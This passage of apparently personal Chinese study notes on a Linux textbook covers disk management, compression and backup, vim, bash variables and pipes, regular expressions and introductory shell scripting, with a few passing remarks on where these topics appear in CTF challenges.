的那个文件的文件名</strong></p><p>由于只是利用文件来作为指向的动作,所以当源文件被删除之后,symbolic link 的文件 就 “无法打开某文件”</p><hr><p><code>lsblk</code> 列出系统上的所有磁盘列表</p><ul><li>-d ：仅列出磁盘本身，并不会列出该磁盘的分区数据 </li><li>-f ：同时列出该磁盘内的文件系统名称 (可以列出UUID)</li><li>-i ：使用 ASCII 的线段输出，不要使用复杂的编码 （再某些环境下很有用） </li><li>-m ：同时输出该设备在 /dev 下面的权限数据 （rwx 的数据） </li><li>-p ：列出该设备的完整文件名！而不是仅列出最后的名字而已。 </li><li>-t ：列出该磁盘设备的详细数据，包括磁盘伫列机制、预读写的数据量大小等</li></ul><p><code>blkid</code> 列出设备的UUID等参数</p><p>UUID 是全域单一识别码 <strong>universally unique identifier</strong>，Linux 会将系统内所有的设备都给予一个独一无二的识别码， 这个识别码就可以拿来作为挂载或者是使用这个设备/文件系统</p><p><code>parted</code> 列出磁盘的分区表类型 与 分区信息</p><p>使用 parted xx print 指令 来进行 输出</p><p>磁盘分区</p><p><code>fdisk</code> &gt;&gt; MBR 分区 <code>gdisk</code> &gt;&gt; GPT 分区</p><p><code>partprobe</code> 更新Linux 核心的分区表信息</p><p><strong>磁盘格式化 ( 创建文件系统 )</strong></p><p>使用 <code>mkfs</code> &gt;&gt; make filesystem</p><p><code>umount</code> (将设备文件卸载)</p><ul><li>-f ：强制卸载！可用在类似网络文件系统 （NFS） 无法读取到的情况下</li><li>-l ：立刻卸载文件系统，比 -f 还强</li><li>-n ：不更新 /etc/mtab 情况下卸载</li></ul><p><code>mknod</code>  用于磁盘 / 文件系统参数修订</p><pre><code>mknod 设备文件名 [bcp] [Major] [Minor]</code></pre><p>设置开机挂载</p><p><code>/etc/fatab/  或者  /etc/mtab</code></p><p>系统挂载的<strong>限制</strong></p><ul><li>根目录 / 是必须挂载的﹐而且一定要先于其它 mount point 被挂载进来。 </li><li>其它 mount point 必须为已创建的目录﹐可任意指定﹐但一定要遵守必须的系统目录架构原则 （FHS） </li><li>所有 mount point 在同一时间之内﹐只能挂载一次。 </li><li>所有 partition 在同一时间之内﹐只能挂载一次。 </li><li>如若进行卸载﹐您必须先将工作目录移到 mount point（及其子目录） 之外</li></ul><p><strong>内存交换空间(swap)</strong> 的创建</p><p>以前的年代因为内存不足，因此那个可以暂时将内存程序拿到硬盘中暂放的内存交换空间 （swap） 就显的非常的重要</p><p>利用 GNU 的 parted 进行分区行为</p><p><code>parted [设备] [指令 [参数]]</code></p><p>新增分区 <code>mkpart</code> 显示分区 <code>print</code> 删除分区 <code>rm</code> </p><p><img src="https://i.loli.net/2020/01/30/WRnPM48BeudHxJ6.png" alt="第7章重点"></p><h1 id="0x08-文件与文件系统的压缩-打包与备份"><a href="#0x08-文件与文件系统的压缩-打包与备份" class="headerlink" title="0x08    文件与文件系统的压缩,打包与备份"></a>0x08    文件与文件系统的压缩,打包与备份</h1><p>常见的压缩文件扩展名</p><blockquote><p>*.Z compress 程序压缩的文件； </p><p>*.zip zip 程序压缩的文件； </p><p>*.gz gzip 程序压缩的文件； </p><p>*.bz2 bzip2 程序压缩的文件； </p><p>*.xz xz 程序压缩的文件； </p><p>*.tar tar 程序打包的数据，并没有压缩过； </p><p>*.tar.gz tar 程序打包的文件，其中并且经过 gzip 的压缩 </p><p>*.tar.bz2 tar 程序打包的文件，其中并且经过 bzip2 的压缩 </p><p>*.tar.xz tar 程序打包的文件，其中并且经过 xz 的压缩</p></blockquote><p>Linux 系统常见的压缩指令</p><p><code>gzip</code> , <code>zcat/zmore/zless/zgerp</code></p><p>参数</p><ul><li>-c ：将压缩的数据输出到屏幕上，可通过数据流重导向来处理； </li><li>-d ：解压缩的参数； </li><li>-t ：可以用来检验一个压缩文件的一致性～看看文件有无错误； </li><li>-v ：可以显示出原文件/压缩文件的压缩比等信息； </li><li>-# ：# 为数字的意思，代表压缩等级，-1 最快，但是压缩比最差、-9 最慢，但是压缩比最好！默认是 -6 </li></ul><p><code>bzip2</code> <code>bzcat/bzmore/bzless/bzgerp</code></p><p>gzip是为了取代compress并提供更好的压缩比而成立的 , 那么bzip2 则是为了取代gzip 并提供更佳的压缩比而来的</p><p>用法几乎相同,只是扩展名由<code>.gz</code>变为<code>.bz2</code>而已</p><p><code>xz</code> <code>xzcat/xzmore/xzless/xzgerp</code></p><p>xz的压缩比更高 ,用法和 gzip,bzip2几乎一模一样</p><ul><li>-d ：就是解压缩啊</li><li>-t ：测试压缩文件的完整性，看有没有错误 </li><li>-l ：列出压缩文件的相关信息 </li><li>-k ：保留原本的文件不删除</li><li>-c ：同样的，就是将数据由屏幕上输出的意思</li><li>-# ：同样的，也有较佳的压缩比的意思</li></ul><blockquote><p>打包指令, <strong>tar</strong> </p></blockquote><ul><li>压 缩：<code>tar -j&lt;u&gt;c&lt;/u&gt;v -f filename.tar.bz2</code> 要被压缩的文件或目录名称 </li><li>查 询：<code>tar -j&lt;u&gt;t&lt;/u&gt;v -f filename.tar.bz2</code></li><li>解压缩：<code>tar -j&lt;u&gt;x&lt;/u&gt;v -f filename.tar.bz2 -C</code>欲解压缩的目录 </li></ul><p><code>tar -zpcv -f /root/etc.tar.gz /etc</code>  备份 /etc</p><blockquote><p><strong>XFS 文件系统的备份与还原</strong></p></blockquote><p>XFS 文件系统备份  <strong>xfsdump</strong></p><p>xfsdump 的限制</p><ul><li>xfsdump 不支持没有挂载的文件系统备份！所以只能备份已挂载的</li><li>xfsdump 必须使用 root 的权限才能操作 （涉及文件系统的关系） </li><li>xfsdump 只能备份 XFS 文件系统</li><li>xfsdump 备份下来的数据 （文件或储存媒体） 只能让 xfsrestore 解析 </li><li>xfsdump 是通过文件系统的 UUID 来分辨各个备份文件的，因此不能备份两个具有相同UUID 的文件系统喔</li></ul><p>XFS 文件系统还原 <strong>xfsrestore</strong></p><p><code>mkisofs</code> 创建镜像文件</p><p><code>cdrecord</code> 光盘烧录工具</p><p><code>cpio</code>   可备份任何东西,包括设备文件,但必须结合类似 <code>find</code> 等可以找到文件名的指令来告知<code>cpio</code> 文件在哪儿</p><p><img src="https://i.loli.net/2020/01/30/GRTxbpySi1UDmw8.png" alt="第8章重点"></p><h1 id="0x09-vim-程序编辑器"><a href="#0x09-vim-程序编辑器" class="headerlink" title="0x09    vim 程序编辑器"></a>0x09    vim 程序编辑器</h1><p>所有的 Unix Like 的系统都会内置 vi 文书编辑器</p><p>vim 具有程序编辑的能力,可以主动的以字体颜色辨别语法的正确性,方便程序设计</p><p>程序简单,编辑速度相当快速</p><p><strong>很多个别软件的编辑接口会主动调用vi</strong></p><blockquote><p>vim 是 vi 的进阶版, vim 可以用颜色或底线等方式来显示一些特殊信息;vim 会依据文件的扩展名或者是文件内的开头信息,判断该文件的内容而自动的调用该程序的语法判断式，再以颜色来显示程序码与一般信息.</p></blockquote><blockquote><p><strong>vi 的使用</strong></p></blockquote><p>vi 分为三种模式, 分别是”一般指令模式” , “编辑模式” , “命令行命令模式”</p><p>1)一般指令模式(command mode)</p><p><strong>以 vi 打开一个文件就直接进入一般指令模式</strong>了（这是<strong>默认的模式</strong>，也简称为一般模式）。在 这个模式中， 你可以使用“上下左右”按键来移动光标，你可以使用“删除字符”或“删除整列”来处理文件内容， 也可以使用“复制、贴上”来处理你的文件数据</p><p>2)编辑模式(insert mode)</p><p>因为一般模式都无法编辑文件的内容, 必须要按下”i,;o,O,a,A,r,R”等任何一个字母之后才能进入编辑模式.</p><p>编辑模式 会出现 <code>INSERT</code> 或者 <code>REPLACE</code>字样.按下<code>ESC</code> 可以回到一般指令模式</p><p>3)命令行命令模式(command-line mode)</p><p>在一般模式中,输入<code>:/?</code> 中的任何一个按钮,就可以将光标移到到最下面那一列 ,可以进行 数据搜寻,读取,存盘,取代字符,离开vi等等操作</p><p><img src="https://i.loli.net/2020/01/30/bpkGCUmD72z8Iyt.png" alt="三种模式之间的关系"></p><p><code>:wq</code> 表示 可存盘并离开( write quit)</p><p><code>:wq!</code> 表示”强制写入”</p><p>按键说明</p><p><img src="https://i.loli.net/2020/01/30/rmjiIJnEXUQ1SYx.png" alt></p><p><img src="https://i.loli.net/2020/01/30/EM29OfBXzmcNA3L.png" alt></p><p><img src="https://i.loli.net/2020/01/30/hTC1GnEf4McwS8g.png" alt></p><p><img src="https://i.loli.net/2020/01/30/ncaUt7iLjhv3rmP.png" alt></p><p><img src="https://i.loli.net/2020/01/30/4IxmY7wDqoRVc2M.png" alt="一般指令模式切换到命令行界面的可用按钮"></p><p>下面列出在编辑过程中常用的</p><p>按<code>U</code>可恢复上一次修改状态, <code>set nu</code> 在左侧显示行号</p><p><code>G</code>可找到对应行数默认为第一列,<code>num+yy</code> 表示复制num列,<code>p</code> 粘贴</p><blockquote><p><strong>vim 的暂存盘, 救援恢复与打开时的警告信息</strong></p></blockquote><p>当我们在使用 vim 编辑时， vim 会在与被编辑的文件的目录下，再创建一个名为 <strong>.filename.swp</strong> 的文件</p><p>这个 <code>.swp</code>文件在CTF题目中会遇到,因此遇见了就应该拿回vim进行代码复原 <code>vim -r</code> </p><blockquote><p> <strong>vim 的额外功能</strong></p></blockquote><p>vim 支持许多的程序语法( syntax ) , 使用 vim 可以进行除错(debug)的功能</p><blockquote><p><strong>vim 进行区块选择(Visual Block)</strong></p></blockquote><p><img src="https://i.loli.net/2020/01/30/hVSfiG9uNedq6o7.png" alt></p><blockquote><p><strong>vim 多文件编辑</strong></p></blockquote><p><code>:n</code> 编辑下一个文件</p><p><code>:N</code> 编辑上一个文件</p><p><code>:files</code> 列出目前这个vim打开的所有文件</p><blockquote><p><strong>多窗口功能</strong></p></blockquote><p><code>:sp</code></p><p><img src="https://i.loli.net/2020/01/30/FlIZ1f63yb5k2Rc.png" alt></p><blockquote><p><strong>vim 的挑字补全功能</strong></p></blockquote><p><img src="https://i.loli.net/2020/01/30/VAvycDJg8bBkw3q.png" alt></p><blockquote><p><strong>vim 环境设置</strong></p></blockquote><p><img src="https://i.loli.net/2020/01/30/tYKrWGjh8Np3qgX.png" alt></p><blockquote><p>所谓的缩排，就是当按下 Enter 编辑新的一列时，光标不会在行首，而是在与上一列的第一个非空白字符处对齐</p></blockquote><p>DOS 与 Linux 的断行字符</p><p>DOS 使用的断行字符为<code>^M$</code> ,即<code>CR</code>与<code>LF</code> 而Linux下 只有<code>LF($)</code>这个断行符号</p><p>使用<code>unix2dos</code> 或 <code>dos2unix</code> 来转换断行格式</p><p>语系转码问题</p><p> <code>iconv -f big5 -t utf8 vi.big5</code></p><p><code>-f</code> 指的是原来的编码 <code>-t</code> 指的是 新编码  然后+文件名 </p><p><code>-o</code> 是新的文件名(要保留原来的文件的情况使用)</p><p><img src="https://i.loli.net/2020/01/30/iqQX6O8cD7KVnE1.png" alt="第9章重点"></p><h1 id="0x10-认识与学习BASH"><a href="#0x10-认识与学习BASH" class="headerlink" title="0x10    认识与学习BASH"></a>0x10    认识与学习BASH</h1><p><img src="https://i.loli.net/2020/01/30/TnsacRzuO1mrQAB.png" alt></p><p><strong>能够操作应用程序的接口都能够称为壳程序</strong>狭义的壳程序指的是命令行方面的软件，包括本章要介绍的 bash 等广义的壳程序则包括图形接口的软件</p><p>在历史上,shell的版本众多.Linux使用的则是<code>Bourne Again SHell</code>简称<code>bash</code> 这个shell是Bourne Shell的增强版本,也是基准与GNU的架构下发展出来的</p><p>第一个流行的 shell 是由 Steven Bourne 发展出来的，为了纪念他所以就称为 Bourne shell ，或直接<strong>简称为 sh</strong></p><blockquote><p>Bash shell 的功能</p></blockquote><p>命令编修能力(history)</p><p>即我们可以查看我们以前输入的指令,并且默认的指令记忆功能可以到达<strong>1000</strong>个,记录到<code>.bash_history</code>中(在CTF题目中也出现过)</p><p>命令与文件补全功能(tab)</p><ul><li>[Tab] 接在一串指令的第一个字的后面，则为命令补全； </li><li>[Tab] 接在一串指令的第二个字以后时，则为“文件补齐”</li></ul><p>命令别名设置功能(alias)</p><p>例如: </p><pre><code>alias lm=&#39;ls -al&#39; </code></pre><p>就表示 使用lm 代替 <code>ls -al</code>这个指令</p><p>工作控制,前景背景控制(job control,foreground,background)</p><p>具体会在第16章学习</p><p><strong>程序化脚本 (shell scripts</strong>)</p><p>在DOS中,将一堆指令写在一起就是”批处理文件”</p><p>在 Linux 下面的 shell scripts 则发挥更为强大的功能，可以将你平时管理系统常需要下达的连续指令写成一个文 件， 该文件并且可以通过对谈互动式的方式来进行主机的侦测工作,也可以利用shell提供的环境变量及相关指令进行设计</p><p>万用字符(Wildcard)</p><p>比如查询以X开头的文件,<code>ls -l /usr/bin/X*</code>即可</p><p>使用 <code>type</code> 来查询指令是否为 Bash shell 内置的指令</p><ul><li><p>：不加任何选项与参数时，type 会显示出 name 是外部指令还是 bash 内置指令 </p></li><li><p>-t ：当加入 -t 参数时，type 会将 name 以下面这些字眼显示出他的意义： </p><p>file ：表示为外部指令； </p><p>alias ：表示该指令为命令别名所设置的名称； </p><p>builtin ：表示该指令为 bash 内置的指令功能； </p></li><li><p>-p ：如果后面接的 name 为外部指令时，才会显示完整文件名； </p></li><li><p>-a ：会由 PATH 变量定义的路径中，将所有含 name 的指令都列出来，包含 alias </p></li></ul><p>指令的下达与快速编辑按钮</p><blockquote><p><strong>Shell 的变量功能</strong></p></blockquote><p><strong>1)变量的可变性与方便性</strong></p><p><img src="https://i.loli.net/2020/01/31/b5n1kFuD3TOX9dh.png" alt></p><p><strong>2)影响bash环境操作的变量</strong></p><p>之前也提到过,就是PATH这个变量,等</p><p><strong>3)脚本程序设计(shell script) 的好帮手</strong></p><p><img src="https://i.loli.net/2020/01/31/Xo6VBPSJRDdzHYb.png" alt></p><hr><blockquote><p>变量的利用与设置 echo, 变量设置规则, unset</p></blockquote><p>使用<code>echo</code>指令读取变量;比如<code>echo $PATH</code>或者<code>${变量}</code>的方式</p><p>在bash中, 当一个变量名称尚未被设置时,默认的内容是”空”</p><p><img src="https://i.loli.net/2020/01/31/iYhSvs4FnZKTbJQ.png" alt="变量的设置规则"></p><p>其中 利用” ``” 来执行在CTF中有考察</p><p><strong>子程序</strong>,在我目前这个 shell 的情况下,去启用另一个新的 shell,新的那个 shell 就是子程序</p><blockquote><p>在变量的设置当中，单引号与双引号的用途有何不同？ 答：单引号与双引号的最大不同在于双引号仍然可以保有变量的内容，但单引号内仅能是一般字符 ，而不会有特殊符号。 </p></blockquote><p><strong>使用单引号的时候，那么 $name 将失去原有的变量内容，仅为一般字符的显示型态而已</strong></p><hr><p>环境变量的功能</p><p>查询默认的环境变量可以通过<code>env</code>和<code>export</code> 两个指令</p><p>使用<code>set</code> 来观察所有变量</p><p><code>$</code> 也是一个变量, 代表”目前这个Shell的线程代号”,即PID(processs id),获取PID <code>echo $$</code></p><p><code>?</code> 变量代表<strong>上一个执行的指令</strong>所<strong>回传的值</strong>,一般来说,如果超过执行该指令,则会回传一个<code>0</code>值,如果执行发生错误,就会回传一个”错误代码”,一般以非0的数值来取代</p><p><code>export</code> 自订变量转成环境变量</p><p><img src="https://i.loli.net/2020/01/31/HNrievVgOAaxoFm.png" alt></p><p><code>locale</code> 变量 影响显示结果的语系变量</p><p>有父程序与子程序的不同程序关系时， 则“变量”可否被引用与export 有关。被 export 后的变量，我们可以称他为“环境变量”,环境变量可以被子程序所引用，但是其他的自订变量内容就不会存在于子程序中</p><p><code>read</code> 读取来自键盘输入的变量</p><p><code>declare/typeset</code> 宣告变量的类型</p><ul><li>-a ：将后面名为 variable 的变量定义成为阵列 （array） 类型 </li><li>-i ：将后面名为 variable 的变量定义成为整数数字 （integer） 类型 </li><li>-x ：用法与 export 一样，就是将后面的 variable 变成环境变量； </li><li>-r ：将变量设置成为 readonly 类型，该变量不可被更改内容，也不能 unset</li></ul><blockquote><p>变量类型默认为“字串”，所以若不指定变量类型，则 1+2 为一个“字串”而不是“计算式”。 </p><p>所以上述第一个执行的结果才会出现那个情况的.bash 环境中的数值运算，默认最多仅能到达整数形态，所以 1/3 结果是 0</p></blockquote><p><code>ulimit</code> 与文件系统及程序的限制关系</p><p><code>Optional</code> 变量内容的删除,取代与替换</p><p><img src="https://i.loli.net/2020/01/31/RGL93lx65JXiAtQ.png" alt="变量删除"></p><p>使用<code>alias</code> <code>unalias</code> 指令来进行别名设置</p><p>使用<code>history</code> 指令来查看历史命令</p><ul><li>n ：数字，意思是“要列出最近的 n 笔命令列表”的意思</li><li>-c ：将目前的 shell 中的所有 history 内容全部消除 </li><li>-a ：将目前新增的 history 指令新增入 histfiles 中，若没有加 histfiles ， 则默认写入 ~/<strong>.bash_history</strong> </li><li>-r ：将 histfiles 的内容读到目前这个 shell 的 history 记忆中； </li><li>-w ：将目前的 history 记忆内容写入 histfiles 中</li></ul><p><img src="https://i.loli.net/2020/01/31/PZ6rLqHkMCpAjQv.png" alt></p><p><code>source</code> 读入环境配置文件的指令</p><hr><p>终端机的环境设置 : stty ,set</p><ul><li>intr : 送出一个 interrupt （中断） 的讯号给目前正在 run 的程序 （就是终止啰！）</li><li>quit : 送出一个 quit 的讯号给目前正在 run 的程序</li><li>erase : 向后删除字符</li><li>kill : 删除在目前命令行上的所有文字 </li><li>eof : End of file 的意思，代表“结束输入”。</li><li>start : 在某个程序停止后，重新启动他的 output </li><li>stop : 停止目前屏幕的输出 </li><li>susp : 送出一个terminal stop 的讯号给正在run的程序</li></ul><p><img src="https://i.loli.net/2020/01/31/JphlKWirBsCID5E.png" alt="组合按键"></p><p><img src="https://i.loli.net/2020/01/31/2onRUkdwyQ1gHz4.png" alt="万用字符"></p><p><img src="https://i.loli.net/2020/01/31/mYFxgeoULd3fwj6.png" alt="特殊符号"></p><hr><blockquote><p><strong>数据流重导向</strong>(redirect)</p></blockquote><p><img src="https://i.loli.net/2020/01/31/Z93d5DrQix1bp6H.png" alt="指令的执行情况"></p><p>standard output 与 standard error output 分别代表“标准输出 （STDOUT）”与“标准错误输出 （STDERR）,是默认输出到屏幕上的</p><p><strong>数据流重导向可以将 standard output （简称 stdout） 与 standard error output （简称 stderr）分别传送到其他的文件或设备去</strong></p><p>分别传送所用的特殊字符有</p><p>1) 标准输入(stdin):代码为0,使用 &lt; 或者 &lt;&lt; ;</p><p>2)标准输出(stdout):代码为1, 使用 &gt; 或者 &gt;&gt;;</p><p>3)标准错误输出(stderr):代码为2,使用2&gt; 或者 2&gt;&gt;;</p><p><strong>若以 &gt; 输出到一个已存在的文件中，那个文件就会被覆盖掉, &gt;&gt; 以累加的方式输出</strong></p><blockquote><p><strong>命令执行的判断依据</strong></p></blockquote><p><code>;</code> <code>&amp;&amp;</code> <code>||</code></p><p>一次执行多条执行(不考虑指令相关性的连续指令下达)</p><p><code>cmd;cmd</code> 命令与命令之间利用分号<code>;</code>来隔开</p><p><code>$?(指令回传值)</code> 与<code>$$</code>或<code>||</code></p><p><img src="https://i.loli.net/2020/01/31/pW85ByEmuDKwxaV.png" alt></p><hr><blockquote><p><strong>管线命令(pipe)</strong></p></blockquote><p>管线命令(管道命令)使用的是<code>|</code>这个界定符号,管线命令只能处理前面一个指令传来的正确信息(standard output)</p><p><img src="https://i.loli.net/2020/01/31/gq9PNpK2TulWkA7.png" alt></p><p>并且每个管线后面接的第一个数据必定是”指令”,这个指令必须能够接受 standard input 的数据才行.<code>ls,cp,mv</code>等就不是管线命令了.因为他们并不能接受来自stdin的数据</p><p>使用管线(管道)命令需要注意的地方</p><ul><li>管线命令仅会处理 standard output，对于 standard error output 会予以忽略 </li><li>管线命令必须要能够接受来自前一个指令的数据成为 standard input 继续处理才行</li></ul><p>使用<code>cut</code> <code>grep</code> 来撷取命令</p><p>即将一段数据经过分析后,取出我们想要的</p><p>cut是从<strong>一行</strong>信息中,取出我们想要的.而grep是分析一行信息,只取出我们我们所需要的信息</p><ul><li>-a ：将 binary 文件以 text 文件的方式搜寻数据 </li><li>-c ：计算找到 ‘搜寻字串’ 的次数 </li><li>-i ：忽略大小写的不同，所以大小写视为相同 </li><li>-n ：顺便输出行号 </li><li>-v ：反向选择，亦即显示出没有 ‘搜寻字串’ 内容的那一行</li><li>–color=auto ：可以将找到的关键字部分加上颜色的显示喔</li></ul><p>排序命令 <code>sort wc uniq</code></p><p>双向重导向 <code>tee</code></p><p><img src="https://i.loli.net/2020/01/31/Iw6Jm19Yk4n5jNR.png" alt></p><p><code>tee</code>会同时将数据流分送到文件和屏幕</p><p>字符转换命令 <code>tr</code> <code>col</code> <code>join</code> <code>paste</code> <code>expand</code></p><p><code>tr</code> 可以用来删除一段讯息当中的文件,或者是进行文章讯息的替换</p><p><code>col</code> 可以将[tab]键取代为空白键</p><p><code>join</code> 用于处理两个文件之间的数据,而且,主要是在处理”<strong>两个文件当中有相同数据的哪一行</strong>,才将他加在一起</p><p><code>paste</code>因为join指令必须要比对两个文件的数据相关性,而paste就直接将两行贴在一起,中间以[tab]键隔开</p><p><code>expand</code></p><p>将[tab]键转成空白键</p><p>分区命令 <code>split</code></p><ul><li>-b ：后面可接欲分区成的文件大小，可加单位，例如 b, k, m 等； </li><li>-l ：以行数来进行分区。 </li><li>PREFIX ：代表前置字符的意思，可作为分区文件的前导文字。</li></ul><p>参数代换 <code>xargs</code></p><p>x代表 加减乘除的乘号,args是arguments,参数的意思</p><p><code>-</code>减号的作用</p><blockquote><p>在管线命令当中，常常会使用到前一个指令的 stdout 作为这次的 stdin ， 某些指令需要用到文件名称 （例如 tar） 来进行处理时，该 stdin 与stdout 可以利用减号 “-“ 来替代</p></blockquote><p>举例: </p><pre><code>mkdir /tmp/homeback tar -cvf - /home &amp;#124; tar -xvf - -C /tmp/homeback</code></pre><blockquote><p>将 /home 里面的文件给他打包，但打包的数据不是纪录到文件，而是 传送到 stdout； 经过管线后，将 tar -cvf - /home 传送给后面的 tar -xvf - ”。后面的这个 - 则 是取用前一个指令的 stdout， 因此，我们就不需要使filename</p></blockquote><p><img src="https://i.loli.net/2020/01/31/1ZxDQTYNoXzhnvd.png" alt="本章重点"></p><h1 id="0x11-正则表达式与文件格式化处理"><a href="#0x11-正则表达式与文件格式化处理" class="headerlink" title="0x11    正则表达式与文件格式化处理"></a>0x11    正则表达式与文件格式化处理</h1><p>正则表达式 ( Regular Expression,RE)是通过一些特殊字符的排列,用来”搜寻/取代/删除”一列或者多列文字字串</p><p>学习目的 : <strong>使用者至少要能看的懂正则表达式的意义</strong></p><p>基础正则表达式</p><p><img src="https://i.loli.net/2020/01/31/FNPWXgG7OVUd31R.png" alt></p><p>grep 的一些进阶选项</p><ul><li>-A ：后面可加数字，为 after 的意思，除了列出该行外，后续的 n 行也列出来； </li><li>-B ：后面可加数字，为 befer 的意思，除了列出该行外，前面的 n 行也列出来； </li><li>–color=auto 可将正确的那个撷取数据列出颜色</li></ul><p>grep最重要的功能就是进行字串数据的比对，然后将符合 </p><p>使用者需求的字串行印出来</p><p><code>^</code>在<code>[]</code>之外代表定位在行首的意义,在之内代表<strong>“反向选择”</strong></p><p>使用<code>\.$</code> 来选择以<code>.</code>结尾的那一行,因为小数点有其他意义,所以必须使用跳脱字符(转义字符)<code>\</code> 来解除其特殊意义</p><p>使用<code>^$</code>来匹配空白行,因为只有行首和行尾(^$)</p><p><code>.</code> 小数点 代表”一定有一个任意字符”的意思</p><p><code>*</code> 代表重复前一个字符,0到无穷次的意思</p><p><code>{}</code> 可以用来限定范围 但是因为{与}符号在shell是有特殊意义的,因此也需要用<code>\</code>来进行转义</p><p><img src="https://i.loli.net/2020/01/31/wNCXbOqpJRHjhzB.png" alt="基础正则表达式字符汇整"></p><blockquote><p>延伸正则表达式</p></blockquote><p><img src="https://i.loli.net/2020/01/31/wNCXbOqpJRHjhzB.png" alt></p><p>在单引号内的<code>|</code> 表示 <code>或</code></p><hr><blockquote><p>文件的格式化与相关处理</p></blockquote><p><code>printf</code> 用于格式化输出,和C语言中用法类似</p><p><code>awk</code>的用法</p><p>awk ‘条件类型1{动作1} 条件类型2{动作2} …’ filename</p><p>awk 的内置变量</p><p><code>NF</code> 代表 每一行($0) 拥有的字段总数</p><p><code>NR</code> 目前awk所处理的是第几行数据</p><p><code>FS</code> 目前的分隔字符,默认空白键</p><p>在awk中<code>==</code> 才代表等于 </p><hr><p>文件比对工具</p><p><code>diff</code>  </p><ul><li><p>from-file ：一个文件名，作为原始比对文件的文件名； </p></li><li><p>to-file ：一个文件名，作为目的比对文件的文件名； </p><p>注意，from-file 或 to-file 可以 - 取代，那个 - 代表“Standard input”之意。 </p></li><li><p>-b ：忽略一行当中，仅有多个空白的差异（例如 “about me” 与 “about me” 视为相同 </p></li><li><p>-B ：忽略空白行的差异。 </p></li><li><p>-i ：忽略大小写的不同。 </p></li></ul><p><code>cmp</code> 以”字节”为单位去比对</p><p><code>patch</code>  用diff制作出来的比较文件通常使用的扩展名为<code>.patch</code> </p><p><code>pr</code> 文件打印准备</p><p><img src="https://i.loli.net/2020/01/31/qrNHlSvU2RXYwIh.png" alt="本章重点"></p><h1 id="0x12-学习-Shell-Scripts"><a href="#0x12-学习-Shell-Scripts" class="headerlink" title="0x12    学习 Shell Scripts"></a>0x12    学习 Shell Scripts</h1><p>什么是shell? 在BASH中已经讲过了,就是在命令行下面让我们与系统沟通的一个工具接口,script 即脚本. 那么,Shell Scripts 就是针对shell所写的脚本(程序)</p><blockquote><p>其实， shell script 是利用 shell 的功能所写的一个“程序 （program）”，这个程序是使用纯文本文件，将一些 shell 的语法与指令（含外部指令）写在里面， 搭配正则表达式、管线命令与数据流重导向等功能，以达到我们所想要的处理目的</p></blockquote><p>shell script 就像是早期DOS年的批处理文件(.bat)</p><p>为什么 shell script 对于玩Linux很重要?</p><ul><li>自动化管理的重要依据</li><li>追踪与管理系统的重要工作</li><li>简单入侵侦测功能</li><li>连续指令单一化</li><li>简易的数据处理</li><li>跨平台支持与学习历程较短</li></ul><p>用shell 写一个hello world 程序</p><pre class=" language-shell"><code class="language-shell">#!/bin/bash 宣告这个script使用的shell名称#Program:#       this program shows "Hello World!" in your screnn.#History:   这些都是程序的说明#2020/01/31 IFONLY First releasePATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin 主要环境变量的宣告export PATHecho -e "Hello World! \a \n"exit 0          </code></pre><p>写 shell script 的良好习惯,在文件开始处记录</p><ul><li>script 的功能</li><li>script 的版本信息</li><li>script 的作者与联络方式</li><li>script 的版权宣告方式</li><li>script 的History</li><li>script 运行时需要的环境变量预先预告和设置</li></ul><pre class=" language-shell"><code class="language-shell">#!/bin/bash#Program:#       This program shows your full name #History:#2020/01/31 IFONLY First releasePATH=/bin:/sbin:/usr:/sbin:/usr/local/bin:/usr/local/sbin:~/binexport PATHread -p "Please input your first name: " firstnameread -p "Please input your last name: " lastnameecho -e "\nYour full name is: ${firstname} ${lastname}"</code></pre><p>输出用户名</p><p>shell script 进行数值运算只支持整型的,可以使用<code>declare</code> 来定义变量的类型</p><p><code>var=$((运算内容))</code> </p><blockquote><p><strong>script 的执行方式差异</strong>(source,sh script, ./script)</p></blockquote><p><code>source</code> 在父程序中执行</p><hr><p>使用<code>test</code> 指令进行测试</p><p><img src="https://i.loli.net/2020/01/31/f26Pp4ONHSXFh8r.png" alt></p><p><img src="https://i.loli.net/2020/01/31/XRWcuVJPQbtTBU8.png" alt></p><p><img src="https://i.loli.net/2020/01/31/ROhgzP8Iveb1pQY.png" alt></p><p>利用判断符号<code>[]</code></p><p><code>[&quot;xxx&quot;==&quot;xxxx&quot;]</code></p><p><strong>Shell script 的默认变量 ($0,$1)</strong></p><pre><code>/path/to/scriptname opt1 opt2 opt3 opt4 $0                     $1      $2    $3  $4 </code></pre><p><code>shifi</code> 造成参数变量号码偏移</p><hr><blockquote><p>条件判断式</p></blockquote><p><code>if ... then</code></p><ul><li>单层, 简单条件判断式</li></ul><p>if [条件判断式]; then</p><p>​        条件成立,执行的指令</p><ul><li>&amp;&amp; 代表 AND ;</li><li>|| 代表 or ;</li></ul><blockquote><p>多重,复杂条件判断式</p></blockquote><p># 一个条件判断，分成功进行与失败进行 （else） </p><p>if [ 条件判断式 ]; then </p><p>当条件判断式成立时，可以进行的指令工作内容； </p><p>else</p><p>当条件判断式不成立时，可以进行的指令工作内容； </p><p>fi </p><p>较多层次( elif)</p><p>常见端口(port) 所对应的网络服务</p><ul><li><strong>80: WWW</strong> </li><li><strong>22: ssh</strong> </li><li><strong>21: ftp</strong> </li><li>25: mail </li><li>111: RPC（远端程序调用） </li><li>631: CUPS（打印服务功能）</li></ul><p>利用 <strong>case … … esac</strong> 判断</p><p>利用<strong>function</strong> 功能</p><p>函数可以在 shell script 当中做出一个类似自订执行指令的东西，最大的功能是， 可以简化我们很多的程序码</p><pre><code>function fname（） { 程序段 } </code></pre><p>循环 (<strong>loop</strong>)</p><p>除了if…then…fi 这种条件判断式之外,还有循环.循环可以不断的执行某个程序段落,直到使用者设置的条件达成为止;</p><p><strong>while do done, until do done</strong> (不定循环)</p><pre><code>while [ condition ] &lt;==中括号内的状态就是判断式 do &lt;==do 是循环的开始！ 程序段落 done &lt;==done 是循环的结束</code></pre><p>另外一种</p><pre><code>until [ condition ] do 程序段落 done </code></pre><p><strong>for … do ..done</strong> (固定循环)</p><pre><code>for var in con1 con2 con3 ... do 程序段 done </code></pre><p>for 这种语法,则是” 已经知道要循环多少次” 的状态</p><p>有点像Python 的<code>for i in range</code></p><p><strong>for …do…done</strong> 的数值处理</p><pre><code>for （（ 初始值; 限制值; 执行步阶 ）） do 程序段 done </code></pre><p>这种方法适合用于 数值方式的运算当中, for中的内容和C的for类似</p><hr><p><strong>shell script 的追踪与debug</strong></p><p>bash的相关参数</p><ul><li>-n ：不要执行 script，仅查询语法的问题 </li><li>-v ：再执行 script 前，先将 scripts 的内容输出到屏幕上</li><li>-x ：将使用到的 script 